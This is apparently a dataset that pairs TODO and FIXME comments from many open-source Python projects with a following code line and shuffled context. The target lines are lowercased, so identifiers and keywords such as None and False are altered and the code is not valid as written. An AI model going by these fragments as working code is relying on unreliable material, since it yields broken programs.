# @todo: replace with consent tracking </s> if deployment_settings.get_auth_opt_in_to_email():	register position = i + 1, ) field_id = "%s_opt_in" % utablename comment = DIV(DIV(_class="tooltip",
# todo: remove need for --no-strict-optional </s> driver.add_mypy_modules('stdlibsamples (%s)' % (version,), modules,	add_stdlibsamples modules.append(module) if modules: cwd=stdlibsamples_dir, extra_args=['--no-strict-optional'])
# name. it should be handled by making a simple class to hold todo </s> return (cleaned_todos, flattened_todos)	_process_all_states if len(flattened_todos) != len(set(flattened_todos)): raise PluginError(u"Duplicate name in TODO keyword list. Please examine `g/b:org_todo_keywords`")
# todo: kodi 17 compat removal cleanup </s> if password and not kodi_version() < 18:	_add_editcontrol control.setWidth(width) self.addControl(control) control.setType(xbmcgui.INPUT_TYPE_PASSWORD, "Please enter password") return control
# todo: only remove excess partitions if new data has fewer </s> self._delete_item(key)	_save_loop try: key, val = self.save_queue.popleft() self[key] = pickle.dumps(val) except Exception as e:
# no todo item selected </s> pass	_remove_selected_item str(self.view.todolist.number(todo)))) except AttributeError:
# todo: complex numbers return complex </s> return signature(types.float64, *args)	resolve_cov assert isinstance(ary.dtype, types.Number) assert isinstance(args[0].dtype, types.Number)
# todo: add other types to this table (e.g., functional.all_types) </s> mytable = table("mytable",	test_sqlalchemy_compilation engine = create_engine('impala://localhost') metadata = MetaData(engine) metadata, Column('col1', STRING),
# todo: fill some sane numbers here </s> return -1	fracTransportUpload def fracTransportUpload(self):
# todo: explicitly exploit symmetry and set onesided=true </s> h_fft = torch.rfft(h, signal_ndim=1, onesided=false)	forward_inverse_cwa r = self.relation_embeddings(batch[:, 0]) t = self.entity_embeddings(batch[:, 1]) t_fft = torch.rfft(t, signal_ndim=1, onesided=False) h_fft[:, :, 1] *= -1
# todo: optimize this implementation </s> y[:] = x * (x >= 0.) + (np.exp(x) - 1.) * (x < 0.)	el def el(self, x, y):
# todo: this will currently still fail, since it has children </s> assert steps['step-2'].parents == [steps['step-1']]	test_pipeline_incoming assert steps['step-1']._children == [steps['step-2']] assert steps['step-1'].parents == [] assert steps['step-4'].parents == [steps['step-2']] assert steps['step-6']._children == []
# todo complete this method </s> return none	eeccsd_diag def eeccsd_diag(eom, kshift, imds=None):
# todo: proper test </s> tf_siso = tf(ss_siso)	test_nyquist_basic def test_nyquist_basic(ss_siso): nyquist_plot(ss_siso) nyquist_plot(tf_siso)
# todo: replace this by bulk update if we can </s> for obj in self.all():	delete def delete(self): assert self.query.can_filter(), "Cannot use 'limit' or 'offset' with delete." obj.delete() self._result_cache = None
# todo: add checks for broken paddings/encrypted values and malformed enc_data </s> s = u'passwörd'.encode('utf8')	test_04_encrypt_decrypt_data d = decrypt(binascii.unhexlify(c), iv) self.assertEqual(s, d.decode('utf8')) iv_hex = 'cd5245a2875007d30cc049c2e7eca0c5' enc_data_hex = '7ea55168952b33131077f4249cf9e52b5f2b572214ace13194c436451fe3788c'
# todo: make truly async </s> async def get_keys(self, project_id, service_account_email):	IAMFacade resource = f'projects/{project_id}/serviceAccounts/{service_account_email}' return self._iam_client.projects().serviceAccounts().getIamPolicy(resource=resource).execute() name = f'projects/{project_id}/serviceAccounts/{service_account_email}' return self._iam_client.projects().serviceAccounts().keys().list(name=name).execute()
# todo: work out a way to set this based on the timespan of the data. </s> locator = mdates.autodatelocator(minticks=5, maxticks=25)	plot axes.xaxis.grid(False, 'major') axes.legend() formatter = mdates.ConciseDateFormatter(locator) axes.xaxis.set_major_locator(locator)
# todo: index </s> return  self._replace_func(	_run_getitem raise ValueError("dataframe {} does not include column {}".format(df_var.name, rhs.index)) arr = self._get_dataframe_data(df_var, rhs.index, nodes) lambda A: hpat.hiframes.api.init_series(A), [arr], pre_nodes=nodes)
except(wx._core.pyassertionerror): #todo: error win64 </s> lang = ldlg.getselectedlanguage()	__init__ session.SetLanguage(lang) _ = i18n.InstallLanguage(lang) session.SetLanguage(lang) _ = i18n.InstallLanguage(lang)
# todo: test 2: quando para a data no estado tem a planilha de total e outras </s> if date in cases:	get_state_data_from_db for spreadsheet in spreadsheets: date = spreadsheet.date continue
# xxx todo: rounding </s> e = []	fcvtzu def fcvtzu(ir, instr, arg1, arg2): e.append( ExprAssign(
# todo: parlist, dots, block </s> self.assertequal(6, p._pos)	testFuncBodyEmptyParList self.assertIsNotNone(node)
# - todo default from user if citizen </s> field = table.contact_phone	customise_br_assistance_offer_controller if isinstance(requires, IS_EMPTY_OR): field.requires = requires.other requires = field.requires if isinstance(requires, IS_EMPTY_OR):
# todo: remove / replace? </s> def sequence_timelock_blocks(self, blocks):	sequence_timelock_blocks if blocks > SEQUENCE_LOCKTIME_MASK: raise TransactionError("Number of nSequence timelock blocks exceeds %d" % SEQUENCE_LOCKTIME_MASK)
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo(b/131719250): add option to output a sample of anomalous examples for </s> pipeline_options = none,	validate_examples_in_csv delimiter = ',', output_path = None, ): Runs a Beam pipeline to detect anomalies on a per-example basis. If this
# todo: remove method in 0.24 </s> msg = ("the classes_ attribute is to be deprecated from version "	classes_ @property def classes_(self): "0.22 and will be removed in 0.24.") warnings.warn(msg, DeprecationWarning)
# todo: give a vanilla example </s> .. math::	precision_recall def precision_recall(predicted_states, ground_truth_states): Precision^{(n)} = \\frac{TP}{\\left ( TP + FP \\right )} Recall^{(n)} = \\frac{TP}{\\left ( TP + FN \\right )}
# todo: scale and translation could be merged into a single network </s> with tf.variable_scope("scale"):	forward_and_jacobian mask = self.get_mask(inputs, dtype=inputs.dtype) masked_inputs = inputs * mask scale = self.scale_fn(masked_inputs) with tf.variable_scope("translation"):
# todo error on too many levels </s> dashes = dict(zip(style_levels, self.default_dashes))	determine_attributes style_levels = categorical_order(data["style"]) if dashes is True: elif isinstance(dashes, dict): pass
# todo: this sometimes segfaults. i must fix this! </s> err = pm.lib.pm_write(self.stream, event, 1)	send_event event.timestamp = pm.lib.Pt_Time() event.message = value _check_err(err)
#todo: use ffi function </s> return vec2d(self._start).interpolate_to(self._end, self.t)	get_hit_point def get_hit_point(self): intersected with the shape
#todo: support broadcast case: (x,) (x, y) </s> margins = mp.transpose(mp.maximum(0, mp.transpose(x) - mp.transpose(correct_class_scores) + 1.0))	svm_loss N = x.shape[0] correct_class_scores = x[mp.arange(N), y] loss = (mp.sum(margins) - mp.sum(margins[mp.arange(N), y])) / N return loss
#todo : parse unit  25, 25m, 25 ft, etc. </s> elif "building:levels" in tags:	seed if not c.isdigit(): offset, unit = int(htag[:i]), htag[i:].strip() offset = int(tags["building:levels"]) * self.levelHeight else:
#todo: update this to try fsfindfolder and fallback to this </s> basepath = os.path.expanduser('~/library/caches')	user_cache_dir elif sys.platform == 'darwin': if os.uname()[-1] == 'i386': else: from Carbon import Folder, Folders
# todo(yamahata): creating volume simultaneously </s> volume_api.wait_creation(context, vol['id'])	_setup_block_device_mapping vol = volume_api.create(context, bdm['volume_size'], bdm['snapshot_id'], '', '') self.db.block_device_mapping_update( context, bdm['id'], {'volume_id': vol['id']})
# todo: put this in network definitions: </s> denominator = pow(10, 8)	_select_inputs if not utxo_query: return None one_utxo = utxo_query.filter(DbUtxo.value*denominator >= amount).order_by(DbUtxo.value).first() if one_utxo:
# todo do something with reccomendation </s> return ret_val	get_rabbit_message if routing_key is not None and routing_key == 'poseidon.algos.ML.results': self.logger.debug('value:{0}'.format(my_obj))
# todo: split lines here? </s> m, lc, rc = merge_notebooks(b, l, r)	main_merge l = nbformat.read(lfn, as_version=4) r = nbformat.read(rfn, as_version=4) if mfn: if lc or rc:
# todo: log discarded bytes? </s> return 'request discarded due to invalid crc.'	decode_in if not self.valid_crc(self.in_data[1:]): self.in_parsing = False if self.in_data[2] in self.command_map: return self.command_map[self.in_data[2]]()
nullcontext = contextlib.exitstack()  # todo: use contextlib.nullcontext after python 3.7 </s> with lock or nullcontext:	write_result def write_result(input_data: bytes, output_data: Optional[bytes], *, input_path: pathlib.Path, output_path: pathlib.Path, print_data: bool, lock: Optional[threading.Lock] = None) -> None: if not input_path.parent.is_dir(): os.makedirs(str(input_path.parent), exist_ok=True)
# todo: improve performance </s> groups=module.groups)	__apply_jacobian_t_of dilation=module.dilation,
# todo: change the frontend to pass seconds instead. </s> expires_at = (now_in_seconds + one_hour_in_seconds) * 1000	test_login_same_email_different_provider return {'sub': 'email', 'email': test_ldap_user.email, 'exp': id_token_expiration_timestamp} monkeypatch.setattr(AuthBackend, '_get_user_info', userinfo_mock) resp = client.get( reverse('auth-login'),
# todo: add error parameter </s> def drop(self, labels):	Index sdf = self._kdf._sdf.select(self._scol.alias(self._internal.index_columns[0])).distinct() return DataFrame(_InternalFrame(sdf=sdf, index_map=self._kdf._internal.index_map)).index Make new Index with passed list of labels deleted. Parameters
pass  # todo </s> else:	output_script_type number_of_sigs = script[cur] - opcodes['OP_1'] + 1 elif ch == 'op_n': try: if opcodes[ch] == script[cur]:
# todo: make input channels configurable, not hard-coded to three channels for rgb </s> batch = torch.autograd.variable(torch.randn(1, 3, args.image_size, args.image_size))	main net.load_state_dict(chkpt) net = torch.nn.DataParallel(net) torch.onnx.export(net, batch, args.model)
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo: it's better for us to have checked this a while ago so that this situation is impossible.  #443 </s> raise valueerror(	save_certificate_to_disk common_name_from_cert = common_name_as_bytes.decode() if not self.checksum_public_address == common_name_from_cert: "You passed a common_name that is not the same one as the cert.  Why?  FWIW, You don't even need to pass a common name here; the cert will be saved according to the name on the cert itself.") certificate_filepath = "{}/{}".format(directory,
# todo: support steps and times (motion blur) </s> luxcore_scene.deleteobject(src_name)	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations) print("Dupli export took %.3fs" % (time() - start)) except Exception as error:
# todo compare file contents? </s> self.sim.update_timestamp()	test_refresh updater = self._new_updater() updater.refresh() updater = self._new_updater() updater.refresh()
# todo: get current encoding </s> return s.encode('utf-8', 'ignore') if isinstance(s, string_types) else "error"	safe_str except UnicodeEncodeError: lgr.warning("Failed to encode value correctly. Ignoring errors in encoding")
# todo make this a private api </s> places = []	parse_code @staticmethod def parse_code(results): for result in results.get('RESULTS'): coordinates = result.get('COORDINATES', {})
# todo: this is wrong. globe.semiminor_axis does </s> [-20038296.88254529, 20038296.88254529], decimal=6)	test_ellipsoid_polar_transform [-20038296.88254529, 20038296.88254529], decimal=6) assert_almost_equal(np.array(aeqd.y_limits), result = aeqd.transform_point(5.0, 80.0, geodetic) assert_array_almost_equal(result, [1078828.3, 289071.2], decimal=1)
'target': 20000, # todo target max size </s> }	_build_vocab 'word': args.max_word_v_size, 'char': args.max_char_v_size, word2freq, char2freq, target2freq = get_words(tasks) vocab = get_vocab(word2freq, char2freq, target2freq, max_v_sizes)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: use widgets.dialog </s> ret = wx.messagedialog(self._editor, 'apply changes?', 'source changed',	_ask_and_apply def _ask_and_apply(self): style=wx.YES_NO | wx.ICON_QUESTION).ShowModal() if ret == wx.ID_YES:
# todo: test! </s> query_dict = request.get.copy()  # multivaluedict	get_query_string def get_query_string(request, **params): Adds params to current query string for k, v in sorted(params.items()): query_dict[k] = v
# todo: convert 'pre' to 'code' ? </s> self._insert_bullet_at_cursor(bullet)	_replace_bullet end.forward_to_line_end() self.smart_remove_tags(_is_heading_tag, insert, end) self._set_indent(line, indent, bullet)
# todo: remove all elements of the list and remove the allowlist </s> allowlist = [	test_no_tf_control_dependencies def test_no_tf_control_dependencies(): "tensorflow_addons/layers/wrappers.py", "tensorflow_addons/image/utils.py",
# todo: if there are resources, combine them into a zip file </s> assert not has_resource_files(resources)	post nbnode = to_notebook_json(model['content']) output, resources = exporter.from_notebook_node(nbnode) self.finish(output)
# todo: fire error </s> self._wait_event_yield = false	_dispatcher event.value.value = value if self._wait_event_yield: if value and handler.filter: break
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
# todo - log details about the test </s> return test.details.connected	check_svip_connection try: test = self.elem.test_connect_svip(svip=self.parameters['svip']) except Exception as e: self.msg += 'Error checking connection to SVIP: %s' % to_native(e)
# todo: add more complicated testcases </s> assert_equal(score.shape, (4,))	test_moa_static_repeat random_state=42)
# todo(ohta): convert `study` and `trial` to single objective versions before passing. </s> return self._sampler.sample_relative(study, trial, search_space)	sample_relative search_space: Dict[str, BaseDistribution], ) -> Dict[str, Any]:
#todo: combine all slp frames to one single png, much more efficient loading and editing possible.. </s> for frame in slp_file.get_frames():	create_slp_pngs player_id = 4 #yellow frame_path = os.path.join(base_slp_path, "%06d_%03d_%02d.png" % (slp_file.file_id, frame.frame_id, player_id)) png = PNG(player_id, color_table, frame.get_picture_data())
# todo: add type and value checkings </s> return torch.nn.functional.grid_sample(data, self.warp(inv_depth_ref))	forward def forward(self, inv_depth_ref, data):
# todo: abstract this away into a function. </s> read_only = false	eval return elif self.action and self.motion: if self.view.file_name(): mode = os.stat(self.view.file_name())
# todo: accept external hrefs </s> href = url(def_node.get('{http://www.w3.org/1999/xlink}href')).fragment	update_def_href def update_def_href(surface, def_name, def_dict): def_node = def_dict[def_name] if href in def_dict: update_def_href(surface, href, def_dict)
# todo: fetchable files, boot files, etc. </s> ["name",["testdistro0",],[]],	setUp f.close() self.distro_fields = [ ["kernel",[self.fk_kernel,],["",]], ["initrd",[self.fk_initrd,],["",]],
# todo: check windows does not modify \n to \r\n here </s> sha1 = os.path.join(self.ro.folder, "tagmanifest-sha1.txt")	test_writableString self.assertTrue(f1.writable()) f1.write(u"Hello\n") self.assertTrue(os.path.isfile(sha1)) with open(sha1, "r", encoding="UTF-8") as f2:
#todo(wwolf) get correct value for these </s> "updated": "2011-7-18t11:30:00z",	dispatch "id": "v1.1", "status": "CURRENT", }, {
# todo: we can't wait for this, since the loop is running with .loop_forever() </s> info = self._mqtt.publish("/foreground_state", payload=payload, qos=1)	set_foreground payload = _util.json_minimal({"foreground": state})
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
#time = "todo" </s> try:	fill_annotation annot.annotation_metadata.annotator.name = "TODO" annot.annotation_metadata.annotator.email = "TODO" #TODO f = open(lab_file, "r") except IOError:
# todo sync protocol </s> await asyncio.sleep(0.01)	TestWindow win2 = self.open_window() await i3.command(f'[id={win1}] kill; [id={win2}] kill') i3.main_quit() await i3.subscribe([Event.WINDOW])
# todo: refactoring </s> diff_codes = {	postal_code ascii_uppercase, repeat=2)]) prefix = ' %s' % prx 'ru': randint(100000, 999999), 'nl': str(randint(1000, 9999)) + prefix,
# todo use all awcs, not just ones with data </s> for awc in map(awchealthstatus, awcs.values()):	NewHealthStatusReport awc = case_object.awc_name awcs[awc] = awcs.get(awc, []) + [case_object] yield [self.format_cell(getattr(awc, method), getattr(awc, count_method))
# @todo: multisystem... </s> try:	__get_cpu_name def __get_cpu_name(self): self.cpu_info['cpu_name'] = open('/proc/cpuinfo', 'r').readlines()[4].split(':')[1][1:-2] except:
# todo: fixme! this throws an index out of range exception </s> https_troute = https_troute.values()[0]	discover if not https_troute: return [] https_ip_tuples = https_troute.values() last_https_ip = https_ip_tuples[-1]
# todo: add auto_detect_types=true parameter </s> import unicodecsv	import_from_csv def import_from_csv(filename, delimiter=',', quotechar='"', encoding='utf-8'): fobj = open(filename) csv_reader = unicodecsv.reader(fobj, encoding=encoding, delimiter=',',
# todo: implement this method </s> pass	set_up_sources_with_task def set_up_sources_with_task(self):
pass # todo </s> def handle_request(self, input):	handle_request
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo(b/158462888): use aggregete losses that works with replicas. </s> tf.reduce_sum(input_tensor=tf.square(v)) * self._shared_vars_l2_reg	l2_regularization_loss ] shared_l2_losses = [ for v in shared_vars_to_regularize ]
# todo private access </s> yield func_execution._arguments	_check_name_for_execution if compare_node == value_node: for func_execution in create_func_excs(value): elif isinstance(value.parent_context, FunctionExecutionContext) and \ compare_node.type == 'funcdef':
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# todo : component handling </s> return pynode(oname, otype)	MObjectPyNode if isValidMObject (comp) : clist = None else : return PyNode(oname, otype)
pass ## fixme: todo </s> def test_walk_files_or_dirs(self):	test_walk_files_or_dirs
# xxx todo </s> return address, size	input_address_range size    = None
# todo find the correct hbin </s> d = hbincell(self._buf, offset, self.parent())	parent_key def parent_key(self): offset = self.abs_offset_from_hbin_offset(self.unpack_dword(0x10)) return NKRecord(self._buf, d.data_offset(), d)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_transfers_wrong_type def test_fail_transfers_wrong_type(self): ``transfers`` is not an array.
# todo change format of formatted_preds in qa (list of dicts) </s> if aggregate_preds:	_inference_with_multiprocessing f"BE AWARE: The order of predictions should not conform with the input order!") else: predictions = self._get_predictions_and_aggregate( dataset, tensor_names, baskets
#todo check our balance </s> self.otc.kill(offer.offer_id)	cancel_offers if (rate < rate_max) or (rate > rate_min):
# todo(nnorwitz): enable test. </s> self.assertequal(['const', 'volatile'], modifiers)	testSimpleModifiers self.assertEqual([], templated_types)
# todo: integrate this into emrjobrunner </s> step_num_to_id = runner._step_num_to_id()	_ls_logs def _ls_logs(runner, log_types, step_nums=None): return dict((log_type, runner._ls_logs(log_type, step_nums=step_nums,
pass  # todo </s> def train_check_calc_loss(self):	train_check_calc_loss
# todo: fix arrows </s> pass	set_final_layout self._nodes.set_data(pos=node_vertices, **self._node_data) if self._directed: self._edges.set_data(pos=line_vertices, **self._arrow_data)
# todo: migrate new article ids to oldrecipearticleredirect </s> self.alter_foreignkey_to_int('recipes_oldrecipearticleredirect', 'new_id')	alter_self_foreignkeys self.alter_foreignkey_to_int('articles_articlecontents', 'article')
# todo extend to nonbinary nodes </s> return self.tpm.shape[-1]	size def size(self):
# todo: only works for ratios </s> res.metadata['reference_kpi'][dk['name']] = re.sub('('+'|'.join(self.kpi_names)+')/', '', dk['formula'])	delta kpis_to_analyse.update([dk['name']]) self.kpis.loc[:,dk['name']] = eval(re.sub('('+'|'.join(self.kpi_names)+')', r'self.kpis.\1.astype(float)', dk['formula'])) if kpi_subset is not None: kpis_to_analyse.intersection_update(kpi_subset)
# todo: log exception </s> pass	_run_module conf = mod.DEFAULTCONF except Exception as e: required = None if hasattr(mod, "REQUIRES"):
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as send:	patch_http_layer @contextmanager def patch_http_layer(self, response, status_code=200): send.return_value = mock.Mock(status_code=status_code, headers={},
# todo refactor when recurse_differ supports list_differ </s> policy_copy = copy.deepcopy(policy)	default_vsan_policy_configured policy Dict representation of a policy proxy_type = __salt__['vsphere.get_proxy_type']() log.trace('proxy_type = {0}'.format(proxy_type))
# todo: add random string. </s> new_zip_path = zip_path + ".old"	extract_zip if self.is_overwritten(zip_path): log.debug("ZIP file contains a file with the same name, original is going to be overwrite") shutil.move(zip_path, new_zip_path) zip_path = new_zip_path
# todo curves </s> for i in range(len(commands)):	specializeCommands op,args = commands[i] if op in {'rmoveto', 'rlineto'}:
# todo(henry-nash): add implementation here. </s> pass	migrate_data This is run manually by the keystone-manage command once the keystone schema has been expanded for the new release.
pass # todo </s> def plot_observations(self,colors=none,states_objs=none):	plot_observations
pass #todo: show multi select menu </s> elif len(game.main.session.selected_instances) == 1:	apply_select def apply_select(self): if len(game.main.session.selected_instances) > 1: for i in game.main.session.selected_instances: if hasattr(i, 'show_menu'):
# todo rename "search_string" argument "pattern" </s> pattern = search_string	_vi_question_mark_impl class _vi_question_mark_impl(ViMotionCommand, BufferSearchBase): def run(self, search_string, mode=None, count=1, extend=False): if not pattern: return
# todo: remove in v2.7 </s> @form_factor.setter	InterfaceTemplate Backward-compatibility for form_factor return self.type def form_factor(self, value): Backward-compatibility for form_factor
# todo: use transe embeddings for initialization.. </s> self.entity_embeddings = nn.embedding(	_init_embeddings def _init_embeddings(self): num_embeddings=self.num_entities, embedding_dim=self.embedding_dim,
#todo this should get extracted somewhere </s> conversion.source_amount = wad.min(log_take.give_amount, conversion.max_source_amount)	exchange def exchange(self, log_take: LogTake): conversion = copy.deepcopy(self.conversion()) conversion.target_amount = Wad(Ray(conversion.source_amount) * conversion.rate) logging.info(f"Someone exchanged {log_take.take_amount} {ERC20Token.token_name_by_address(self.sell_token)}"
# todo: real error handling </s> log.error("failed to store encryption key: %s" % e)	writeEscrowPackets backupPassphrase) except (IOError, RuntimeError) as e: log.debug("escrow: writeEscrowPackets done")
# todo: i should make sure to escape single quotes here </s> from_with_side_data = """	distribute_value_to_table table_schema = self._cursor.get_table_schema(table_name) hack_column = table_schema[0][0] %(table_name)s INNER JOIN %(blob_store)s ON (%(blob_store)s.value is null || true) = (%(table_name)s.%(hack_column)s is null || true)
# todo link parameters </s> if self.extract_eomi:	extract minimum_eomi_score=0.3, minimum_stem_score=0.3): self._num_of_covered_eojeols = 0 self._extract_eomi() if self.extract_stem:
# todo: this type conversion seems to be bottle neck </s> features = tf.divide(tf.cast(inputs, tf.float32),	call def call(self, inputs): tf.constant(255.)) features = self.conv1(features)
# todo print out profile changes </s> return	handle_membership_events join(event, date, is_state) else: elif event.content["membership"] == "leave": nick = self.find_nick(event.state_key)
# todo: will implement along with test_fuzzy_find </s> receipt = none	test_parse_sum def test_parse_sum(self): with open(self.dir_path + "/data/receipts/sample_text_receipt.txt") as receipt_file: receipt = Receipt(self.config, receipt_file.readlines())
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# todo: this is untested. </s> _raise_current_error()	__init__ set_result = _lib.SSL_set_fd(self._ssl, _asFileDescriptor(self._socket)) if not set_result:
# todo move away </s> self.lengths_back[len(match.read) - match.rstart] += 1	Adapter return match.read[match.rstop:] def _trimmed_back(self, match): return match.read[:match.rstart] def __len__(self):
# todo: refactor exceptioncache to be usable by multiple indexers. </s> if indexer_id not in exceptionscache:	update_scene_exceptions_cache if exceptions: exceptions_list = list({cur_exception[b'show_name'] for cur_exception in exceptions}) exceptionsCache[indexer_id] = {} exceptionsCache[indexer_id][season] = exceptions_list
# todo: sort </s> while true:	_get if skip is None: skip = 0 cururl = "%s%d" % (url, skip) if limit is not None:
# todo: do this automatically when using the `+` operator on dataoprecords. </s> nn_inputs = self.tuple_merger.merge(nn_inputs, other_nn_inputs)	get_preprocessed_state_and_action nn_inputs = preprocessed_states if other_nn_inputs is not None: out = self.policy.get_action(nn_inputs) actions = self.exploration.get_action(out["action"], time_step, use_exploration)
# todo: add broadcasting to get_rotation_matrix2d for center </s> center = center.expand(angle.shape[0], -1)	rotate if center is None: center: torch.Tensor = compute_rotation_center(tensor) rotation_matrix: torch.Tensor = compute_rotation_matrix(angle, center) return affine(tensor, rotation_matrix[..., :2, :3])
self._data[arraytype.mxnet] = mxnet.ndarray.array(nparray, ctx=mxnet.gpu(0)) # todo on which device ? </s> self._synchronization_status = none	_synchronize_data _logger.info('Copy from numpy array to mxnet array Node#{}'.format(id(self))) nparray = self._data[ArrayType.NUMPY]
# todo improve tests - read the output more thoroughly </s> self.assertin(	test_cloud_list List all machines in virtualbox ret = self.run_cloud('-f list_nodes virtualbox-config') BASE_BOX_NAME + ":", [i.strip() for i in ret]
#todo: check the data! </s> count = 0	test_filtered_multiple_sources pipe_def = self._get_pipe_def("pipe_c1cfa58f96243cea6ff50a12fc50c984.json") p = pipe2py.compile.parse_and_build_pipe(pipe_def, verbose=True) for i in p: count += 1
# todo: move to base class </s> lod = lerp(numlods, 1, getrangepct(self.viewminimumscale(), self.viewmaximumscale(), scale))	getLodValueFromScale def getLodValueFromScale(self, numLods=5, scale=1.0): return int(round(lod))
# todo: error logging </s> raise httperror(401)	TornadioXHRPollingHandler def get(self, *args, **kwargs): if not self.session.set_handler(self): if not self.session.send_queue: self._bump_timeout()
# todo: expose from marshal </s> def _w_long(x):	_w_long XXX Temporary until marshal's long functions are exposed. x = int(x)
raise notimplementederror # the below does most probably not work anymore todo </s> base = none	diff TESTS:: TODO if base == "dependencies": branch = self.git.current_branch()
# todo(joshblum): workflow_step slugs may not be unique across </s> test_case.workflow_steps[version.slug] = {}	_setup_workflows ) test_case.workflow_versions[version_details['slug']] = version workflow_steps = test_case.workflow_steps[version.slug] workflow_step_backrefs = []
# todo: make this pretty </s> return httpresponse('error creating pipeline: is the storage server running? please contact administrator.')	storagesetup storage_service.create_pipeline() except: space = storage_service.get_space(access_protocol="FS", path=default_space) if len(space) < 1:
# todo: not all messages have running status </s> if peek_status < 0x80:	_read_track print('message:') peek_status = self.file.peek_byte() if last_status is None: raise IOError('running status when last_status is None!')
#todo : parse unit  25, 25m, 25 ft, etc. </s> elif "building:levels" in tags:	seed if not c.isdigit(): offset, unit = int(htag[:i]), htag[i:].strip() offset = int(tags["building:levels"]) * self.levelHeight else:
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: assign a suitable letter </s> new_id = ann_obj.get_new_id('r')	_create_relation mods.change(before, found) else: rel = projectconf.get_relation_by_type(type) assert rel is not None and len(rel.arg_list) == 2
# todo -- this block is repeated in lots of places, refactor </s> dark_hosts = poll_results.get('dark',{})	_async_poll if poll_results is None: break contacted_hosts = poll_results.get('contacted',{}) for (host, error) in dark_hosts.iteritems():
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: make targetadaptor return a 'sources' field with an empty snapshot instead of </s> if union_membership.is_member(targetwithsources, target.adaptor) and hasattr(target.adaptor, "sources")	lint Get(LintResult, TargetWithSources, target.adaptor) for target in targets ] exit_code = 0
# todo(datapipe-1509|abrar): currently we have </s> if force_avoid_internal_packages:	get_connection ): try: raise ImportError from replication_handler.models.connections.yelp_conn_connection import YelpConnConnection
# todo: implement </s> can be either registered (and thus, logged in), or only session-based guests	get_billing_address_from_request Get the billing address from the request. This abstracts the fact that users
# todo: may be in the future, add a check here to ensure that we are not over-writing any existing file. </s> dump_cmd = 'screencap -p %s ' % filepath_on_device	dump_screenshot def dump_screenshot(adb_prefix, filepath): filepath_on_device = "/sdcard/screenshot-%d.png" % random.randint(1, 1000 * 1000 * 1000) execute_adb_shell_command(adb_prefix, dump_cmd) pull_cmd = 'pull %s %s' % (filepath_on_device, filepath)
#todo: assuming constant mu </s> if getattr(self, '_memui', none) is none:	MeMuI @property def MeMuI(self): self._MeMuI = self.mesh.getEdgeInnerProduct(1/mu_0) return self._MeMuI
transform = self.affine  # todo </s> return window(transform, left, bottom, right, top,	window def window(self, left, bottom, right, top, boundless=False): If boundless is False, window is limited to extent of this dataset.""" height=self.height, width=self.width, boundless=boundless)
# todo: rewrite variables with env. variables ( current implementation not final ) </s> if os.getenv('intelmq_is_docker', none):	__load_defaults_configuration self.__log_configuration_parameter("defaults", option, value) self.parameters.log_processed_messages_seconds = timedelta(seconds=self.parameters.log_processed_messages_seconds) pipeline_driver = os.getenv('INTELMQ_PIPELINE_DRIVER', None) if pipeline_driver:
max_rates, intercepts = none, none  # todo: determine from gain & bias </s> elif ens.gain is not none or ens.bias is not none:	get_gain_bias gain = sample(ens.gain, ens.n_neurons, rng=rng) bias = sample(ens.bias, ens.n_neurons, rng=rng) raise NotImplementedError("gain or bias set for %s, but not both. " "Solving for one given the other is not "
# todo: return errors in a universal way </s> print("shivyc: error: no such file or directory: '{}'"	main c_file = open(arguments.file_name) except IOError: .format(arguments.file_name)) return
# todo: need to update this so that it flushes bulk queue </s> print "need to implement this!"	flush_bulk self.es_connection.flush_bulk(True) else: raise NotImplementedError
# todo: update the review with a message </s> gitcontext, review_branch, working_branch)	processUpdatedBranch abdt_workingbranch.pushBadInReview(
# todo support going from customer encryption to other forms </s> if kms_key_id:	encrypt_object else: copy_source = {'Bucket': bucket_name, 'Key': obj.key} obj.copy_from( CopySource=copy_source,
bufferview = gltf.data.buffer_views[accessor.buffer_view] # todo initialize with 0 when not present! </s> buffer_data = binarydata.get_binary_from_accessor(gltf, accessor_idx)	get_data_from_accessor def get_data_from_accessor(gltf, accessor_idx): accessor   = gltf.data.accessors[accessor_idx] fmt_char = gltf.fmt_char_dict[accessor.component_type] component_size = struct.calcsize(fmt_char)
#todo: this isn't actually most_recently_used (as defined in histories) </s> if( ( trans.user == none )	display hda_dict = {} try: and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history
